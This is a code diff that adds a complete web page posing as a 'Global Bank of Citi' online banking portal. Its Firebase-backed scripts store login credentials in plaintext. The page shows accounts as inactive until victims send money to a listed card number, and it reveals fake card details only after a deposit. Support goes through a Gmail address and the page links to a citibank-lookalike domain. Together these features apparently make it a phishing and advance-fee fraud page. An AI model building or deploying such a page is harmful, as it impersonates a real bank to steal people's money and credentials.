@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Global Bank of Citi | Online Banking & Customer Services</title>
+    
+    <meta name="description" content="Securely manage your Global Bank of Citi accounts online. Access real-time balances, transfers, and 24/7 customer support from our official portal.">
+    
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Global Bank of Citi - Secure Customer Portal" />
+    <meta property="og:description" content="Experience seamless digital banking with Global Bank of Citi. Check your visa status, manage balances and transactions securely." />
+    <meta property="og:image" content="https://uploads.onecompiler.io/44kz6hkf9/44m256nns/1000222087.png" />
+
+    <link rel="icon" type="image/x-icon" href="https://uploads.onecompiler.io/44kz6hkf9/44m256nns/1000222087.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <meta name="google-site-verification" content="wQpHmguVSgwDX0FRndZ-jBO6nYnIbsbt1YNMrjadpww" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap');
+        body { font-family: 'Outfit', sans-serif; background: #f8fafc; }
+        .gradient-bg { background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 100%); }
+        .bank-card { background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); border-radius: 24px; }
+        .support-btn { position: fixed; bottom: 80px; right: 20px; z-index: 99; animation: bounce 2s infinite; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        .animate-marquee { display: inline-block; animation: marquee 20s linear infinite; }
+        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+    </style>
+</head>
+<body>
+
+    <div id="mainPanel" class="min-h-screen flex items-center justify-center p-4">
+        <div class="bg-white w-full max-w-md p-8 rounded-3xl shadow-2xl">
+            <div class="text-center mb-8">
+         <img src="https://uploads.onecompiler.io/44kz6hkf9/44m256nns/1000222116.png"  alt="aud" 
+         style="width:100%; height:auto;">
+            </div>
+            <div id="loginBox" class="space-y-4">
+                <input id="loginUsername" type="text" placeholder="Account Number" class="w-full px-4 py-3 border rounded-xl outline-none focus:ring-2 focus:ring-blue-500">
+                <input id="loginPassword" type="password" placeholder="Password" class="w-full px-4 py-3 border rounded-xl outline-none focus:ring-2 focus:ring-blue-500">
+                <button onclick="login()" class="w-full gradient-bg text-white py-4 rounded-xl font-bold shadow-lg uppercase">Sign In</button>
+                <div class="flex justify-between text-xs font-bold text-blue-700 px-1">
+                    <a href="#" onclick="forgotPassword()">Forgot Password?</a>
+                    <a href="#" onclick="showSignup()">Open New Account</a>
+                </div>
+              <!-- Example of fixed pixel dimensions -->
+             <img src="https://uploads.onecompiler.io/44kz6hkf9/44m256nns/1000222090.jpg" alt="Description" width="500" height="300">
+            </div>
+            <div id="signupBox" class="hidden space-y-4">
+                <input id="signupName" type="text" placeholder="Full Name" class="w-full px-4 py-3 border rounded-xl outline-none">
+                <input id="signupMobile" type="text" placeholder="Mobile Number" class="w-full px-4 py-3 border rounded-xl outline-none">
+                <input id="signupPassword" type="password" placeholder="Set Password" class="w-full px-4 py-3 border rounded-xl outline-none">
+                <button onclick="signup()" class="w-full bg-green-600 text-white py-4 rounded-xl font-bold uppercase">Register</button>
+                <button onclick="hideSignup()" class="w-full text-slate-400 text-xs font-bold uppercase">Back</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="userPanel" class="hidden min-h-screen">
+        <header class="gradient-bg p-5 text-white flex justify-between items-center sticky top-0 z-50 shadow-lg">
+            <div class="flex items-center gap-3">
+                <div id="userAvatar" class="w-10 h-10 bg-white text-blue-800 rounded-full flex items-center justify-center font-bold text-xl">M</div>
+                <div>
+                    <div class="flex items-center gap-2">
+                        <h2 id="upName" class="font-bold text-md leading-tight">Name</h2>
+                        <span id="accStatus" class="text-[9px] px-2 py-0.5 rounded-full font-bold uppercase">Active</span>
+                    </div>
+                    <p id="upMobile" class="text-[10px] opacity-70">AC: 0000000000</p>
+                </div>
+            </div>
+            <div class="flex gap-2">
+                <button onclick="openModal('historyModal')" class="w-9 h-9 bg-white/10 rounded-lg flex items-center justify-center"><i class="fas fa-list-ul"></i></button>
+                <button onclick="openModal('settingsModal')" class="w-9 h-9 bg-white/10 rounded-lg flex items-center justify-center"><i class="fas fa-cog"></i></button>
+                <button onclick="location.reload()" class="w-9 h-9 bg-red-500/20 rounded-lg flex items-center justify-center"><i class="fas fa-power-off"></i></button>
+            </div>
+        </header>
+
+        <div class="max-w-md mx-auto p-4 space-y-6">
+            <div class="bank-card p-6 text-white h-52 flex flex-col justify-between shadow-xl relative overflow-hidden">
+                <div class="flex justify-between items-start">
+                    <div>
+                        <p class="text-[9px] opacity-60 uppercase tracking-widest">Available Balance</p>
+                        <h1 class="text-3xl font-bold mt-1">৳ <span id="upBalance">0.00</span></h1>
+                    </div>
+                    <button onclick="viewCardDetails()" class="text-[9px] bg-white/20 px-3 py-1.5 rounded-lg font-bold backdrop-blur-sm border border-white/30">VIEW CARD</button>
+                </div>
+                <div>
+                    <p id="cardNum" class="text-lg tracking-[5px] font-mono opacity-90">**** **** **** 0000</p>
+                    <div class="flex justify-between items-end mt-2">
+                        <p id="cardHolder" class="text-[10px] uppercase opacity-60">NAME</p>
+                        <i class="fab fa-cc-visa text-2xl opacity-50"></i>
+                    </div>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-4 gap-3 text-center">
+                <div onclick="openModal('depositModal')" class="cursor-pointer">
+                    <div class="w-14 h-14 mx-auto bg-white rounded-2xl flex items-center justify-center text-blue-600 shadow-sm border"><i class="fas fa-plus"></i></div>
+                    <p class="text-[9px] font-bold mt-2 text-slate-500 uppercase">Add Fund</p>
+                </div>
+                <div onclick="openModal('transferModal')" class="cursor-pointer">
+                    <div class="w-14 h-14 mx-auto bg-white rounded-2xl flex items-center justify-center text-green-600 shadow-sm border"><i class="fas fa-paper-plane"></i></div>
+                    <p class="text-[9px] font-bold mt-2 text-slate-500 uppercase">Send Money</p>
+                </div>
+                <div onclick="openModal('withdrawModal')" class="cursor-pointer">
+                    <div class="w-14 h-14 mx-auto bg-white rounded-2xl flex items-center justify-center text-purple-600 shadow-sm border"><i class="fas fa-wallet"></i></div>
+                    <p class="text-[9px] font-bold mt-2 text-slate-500 uppercase">Transfer</p>
+                </div>
+                <div onclick="openModal('rechargeModal')" class="cursor-pointer">
+                    <div class="w-14 h-14 mx-auto bg-white rounded-2xl flex items-center justify-center text-orange-600 shadow-sm border"><i class="fas fa-mobile-alt"></i></div>
+                    <p class="text-[9px] font-bold mt-2 text-slate-500 uppercase">Top-up</p>
+                </div>
+            </div>
+
+            <div class="space-y-3 pb-20">
+                <h3 class="font-bold text-slate-800 text-sm tracking-tight uppercase">Update Activity</h3>
+                <div id="runningHistory" class="space-y-3"></div>
+            </div>
+        </div>
+
+        <a href="mailto:globalbankofciti@gmail.com" class="support-btn w-14 h-14 bg-blue-600 text-white rounded-full flex items-center justify-center shadow-2xl border-4 border-white"><i class="fas fa-headset text-xl"></i></a>
+        
+        <footer class="fixed bottom-0 left-0 right-0 bg-white border-t py-2 overflow-hidden z-40">
+            <div class="animate-marquee px-4 text-[10px] font-bold text-blue-800 uppercase italic">🏦 Global Bank of Citi Support: globalbankofciti@gmail.com - 24/7 Service</div>
+        </footer>
+    </div>
+
+    <div id="modalOverlay" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-[100] flex items-center justify-center p-5">
+        
+        <div id="customAlertModal" class="hidden modal-card bg-white w-full max-w-sm rounded-3xl p-6 space-y-4 text-center">
+            <div class="w-16 h-16 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mx-auto"><i class="fas fa-info-circle text-2xl"></i></div>
+            <h3 id="alertTitle" class="font-bold text-slate-800 uppercase">🔔 Notification</h3>
+            <p id="alertMessage" class="text-sm text-slate-600"></p>
+            <button onclick="closeModal()" class="w-full gradient-bg text-white py-3 rounded-xl font-bold uppercase">OK</button>
+        </div>
+
+        <div id="depositModal" class="hidden modal-card bg-white w-full max-w-sm rounded-3xl p-6 space-y-4">
+            <h3 class="text-center font-bold text-blue-800 uppercase">Add Money</h3>
+            <p class="text-[10px] bg-blue-50 p-2 rounded text-blue-700">💳 Card No: <b>4466 1480 1085 3626</b></p>
+            <input type="number" id="depositAmt" placeholder="Amount (৳)" class="w-full p-3 border rounded-xl">
+            <input type="text" id="depositTxn" placeholder="Transaction ID" class="w-full p-3 border rounded-xl">
+            <button onclick="submitRequest('Deposit')" class="w-full gradient-bg text-white py-3 rounded-xl font-bold uppercase">Submit</button>
+            <button onclick="closeModal()" class="w-full text-slate-400 text-xs font-bold">Close</button>
+        </div>
+
+        <div id="transferModal" class="hidden modal-card bg-white w-full max-w-sm rounded-3xl p-6 space-y-4">
+            <h3 class="text-center font-bold text-green-700 uppercase">Send Money</h3>
+            <input type="text" id="transferTo" placeholder="Receiver Account" class="w-full p-3 border rounded-xl">
+            <input type="number" id="transferAmt" placeholder="Amount (৳)" class="w-full p-3 border rounded-xl">
+            <button onclick="submitRequest('Transfer')" class="w-full bg-green-600 text-white py-3 rounded-xl font-bold uppercase">Confirm</button>
+        </div>
+
+        <div id="withdrawModal" class="hidden modal-card bg-white w-full max-w-sm rounded-3xl p-6 space-y-4">
+            <h3 class="text-center font-bold text-purple-700 uppercase">Transfer Money</h3>
+            <input type="text" id="withdrawTo" placeholder="Bank Account Info" class="w-full p-3 border rounded-xl">
+            <input type="number" id="withdrawAmt" placeholder="Amount (৳)" class="w-full p-3 border rounded-xl">
+            <button onclick="submitRequest('Withdraw')" class="w-full bg-purple-700 text-white py-3 rounded-xl font-bold uppercase">Transfer</button>
+        </div>
+
+        <div id="rechargeModal" class="hidden modal-card bg-white w-full max-w-sm rounded-3xl p-6 space-y-4">
+            <h3 class="text-center font-bold text-orange-600 uppercase">Top-up</h3>
+            <input type="number" id="rechargeNum" placeholder="Mobile Number" class="w-full p-3 border rounded-xl">
+            <input type="number" id="rechargeAmt" placeholder="Amount (৳)" class="w-full p-3 border rounded-xl">
+            <button onclick="submitRequest('Recharge')" class="w-full bg-orange-600 text-white py-3 rounded-xl font-bold uppercase">Top-Up</button>
+        </div>
+
+        <div id="historyModal" class="hidden modal-card bg-slate-50 w-full max-w-md h-[80vh] rounded-3xl overflow-hidden flex flex-col">
+            <div class="p-5 gradient-bg text-white flex justify-between items-center"><h3 class="font-bold text-sm uppercase">History</h3><button onclick="closeModal()"><i class="fas fa-times"></i></button></div>
+            <div id="fullHistoryList" class="flex-1 overflow-y-auto p-4 space-y-3"></div>
+        </div>
+
+        <div id="settingsModal" class="hidden modal-card bg-white w-full max-w-sm rounded-3xl p-6 space-y-4">
+            <h3 class="text-center font-bold text-slate-800 uppercase">⚙️ Settings</h3>
+            <input id="setNewName" type="text" placeholder="New Name" class="w-full p-3 border rounded-xl">
+            <input id="setNewPass" type="password" placeholder="New Password" class="w-full p-3 border rounded-xl">
+            <button onclick="updateProfile()" class="w-full gradient-bg text-white py-3 rounded-xl font-bold uppercase">✔️ Save</button>
+        </div>
+    </div>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyC46mnAjWV65Ty4KxB903s1O3l92z16SRk",
+        authDomain: "callsmspanel.firebaseapp.com",
+        databaseURL: "https://callsmspanel-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "callsmspanel",
+        storageBucket: "callsmspanel.firebasestorage.app",
+        messagingSenderId: "110135980756",
+        appId: "1:110135980756:web:5b70189d71e2fa0c9d8141"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    let currentAc = null, currentUser = null;
+
+    function showCustomAlert(t, m) { document.getElementById('alertTitle').innerText = t; document.getElementById('alertMessage').innerText = m; openModal('customAlertModal'); }
+
+    function login() {
+        const ac = document.getElementById('loginUsername').value;
+        const pass = document.getElementById('loginPassword').value;
+        db.ref("users/"+ac).once("value").then(s => {
+            if(s.exists() && s.val().password === pass) { currentAc = ac; showDashboard(ac); }
+            else { showCustomAlert("Error", "Wrong Info!"); }
+        });
+    }
+
+    function signup() {
+        const n = document.getElementById('signupName').value, m = document.getElementById('signupMobile').value, p = document.getElementById('signupPassword').value;
+        if(!n || !m || !p) return showCustomAlert("Error", "Fill all!");
+        db.ref("users/"+m).set({ name:n, mobile:m, password:p, balance:0, status:"active", reg_date:Date.now() }).then(() => { showCustomAlert("Success", "Account Created!"); hideSignup(); });
+    }
+
+    function showDashboard(ac) {
+        document.getElementById('mainPanel').classList.add('hidden');
+        document.getElementById('userPanel').classList.remove('hidden');
+        db.ref("users/" + ac).on("value", s => {
+            currentUser = s.val();
+            document.getElementById('upName').innerText = currentUser.name;
+            document.getElementById('upMobile').innerText = "AC: " + currentUser.mobile;
+            document.getElementById('upBalance').innerText = currentUser.balance.toFixed(2);
+            document.getElementById('userAvatar').innerText = currentUser.name[0];
+            document.getElementById('cardHolder').innerText = currentUser.name;
+            document.getElementById('cardNum').innerText = "**** **** **** " + currentUser.mobile.slice(-4);
+            const statusEl = document.getElementById('accStatus');
+            if (currentUser.balance > 0) { statusEl.innerText = "Active"; statusEl.className = "text-[9px] bg-green-500 px-2 py-0.5 rounded-full text-white font-bold uppercase"; }
+            else { statusEl.innerText = "Not Active"; statusEl.className = "text-[9px] bg-red-500 px-2 py-0.5 rounded-full text-white font-bold uppercase"; }
+        });
+        loadHistory(ac);
+    }
+
+    function submitRequest(type) {
+    let amt = 0, target = "";
+    let amtField, targetField; // এই ভেরিয়েবলগুলো দিয়ে ফিল্ড খালি করব
+
+    if(type === 'Deposit') {
+        amtField = document.getElementById('depositAmt');
+        targetField = document.getElementById('depositTxn');
+    } else if(type === 'Transfer') {
+        amtField = document.getElementById('transferAmt');
+        targetField = document.getElementById('transferTo');
+    } else if(type === 'Withdraw') {
+        amtField = document.getElementById('withdrawAmt');
+        targetField = document.getElementById('withdrawTo');
+    } else if(type === 'Recharge') {
+        amtField = document.getElementById('rechargeAmt');
+        targetField = document.getElementById('rechargeNum');
+    }
+
+    amt = parseFloat(amtField.value);
+    target = targetField.value;
+
+    if(!amt || !target) return showCustomAlert("Error", "Missing Data!");
+    if(type !== 'Deposit' && amt > currentUser.balance) return showCustomAlert("Error", "Low Balance!");
+
+    const txnId = "TXN" + Date.now();
+    const data = { user: currentAc, name: currentUser.name, type, amount: amt, target, status: "pending", time: Date.now() };
+
+    db.ref("transactions/" + txnId).set(data).then(() => {
+        if(type !== 'Deposit') db.ref("users/" + currentAc + "/balance").set(currentUser.balance - amt);
+        
+        // --- এখানে ইনপুট ফিল্ডগুলো খালি করার কোড ---
+        amtField.value = ""; 
+        targetField.value = "";
+        
+        showCustomAlert("Success", "Request Sent!"); 
+        closeModal();
+    });
+}
+    function loadHistory(ac) {
+        db.ref("transactions").orderByChild("user").equalTo(ac).on("value", s => {
+            const list = document.getElementById('fullHistoryList'), run = document.getElementById('runningHistory');
+            list.innerHTML = ""; run.innerHTML = "";
+            let txns = []; s.forEach(c => { txns.push(c.val()); }); txns.reverse();
+            txns.forEach((t, index) => {
+                let html = `<div class="flex justify-between items-center p-3 bg-white rounded-2xl shadow-sm border border-slate-50">
+                    <div class="flex items-center gap-3"><div class="w-8 h-8 bg-slate-50 rounded-lg flex items-center justify-center"><i class="fas ${t.type==='Deposit'?'fa-plus text-blue-500':'fa-paper-plane text-green-500'} text-[10px]"></i></div>
+                    <div><p class="text-[10px] font-bold uppercase">${t.type}</p><p class="text-[8px] text-slate-400">${new Date(t.time).toLocaleString()}</p></div></div>
+                    <div class="text-right"><p class="text-[11px] font-bold">৳ ${t.amount}</p><p class="text-[8px] font-bold uppercase ${t.status==='pending'?'text-orange-500':'text-green-500'}">${t.status}</p></div></div>`;
+                list.innerHTML += html; if(index < 3) run.innerHTML += html;
+            });
+        });
+    }
+
+    function viewCardDetails() {
+        if (!currentUser || currentUser.balance <= 0) return showCustomAlert("Inactive", "Please Add Fund to Active!");
+        showCustomAlert("Card Details", "Number: "+currentUser.mobile+"\nCVV: 731\nExpiry: 12/28");
+    }
+
+    function openModal(id) { document.getElementById('modalOverlay').classList.remove('hidden'); document.querySelectorAll('.modal-card').forEach(m => m.classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); }
+    function closeModal() { document.getElementById('modalOverlay').classList.add('hidden'); }
+    function showSignup() { document.getElementById('loginBox').classList.add('hidden'); document.getElementById('signupBox').classList.remove('hidden'); }
+    function hideSignup() { document.getElementById('signupBox').classList.add('hidden'); document.getElementById('loginBox').classList.remove('hidden'); }
+</script>
+<a href="https://citibank-ltd-global-in-canada-com.vercel.app/" target="_blank" style="display:block;">
+  <img src="https://uploads.onecompiler.io/44kz6hkf9/44m256nns/1000222112.png"  alt="aud" 
+   style="width:100%; height:auto;">
+<a href="https://citibank-ltd-global-in-canada-com.vercel.app/" target="_blank" style="display:block;">
+  <img src="https://uploads.onecompiler.io/44kz6hkf9/44m256nns/1000222104.png"  alt="aud" 
+   style="width:100%; height:auto;">
+</a>
+</body>
+</html>
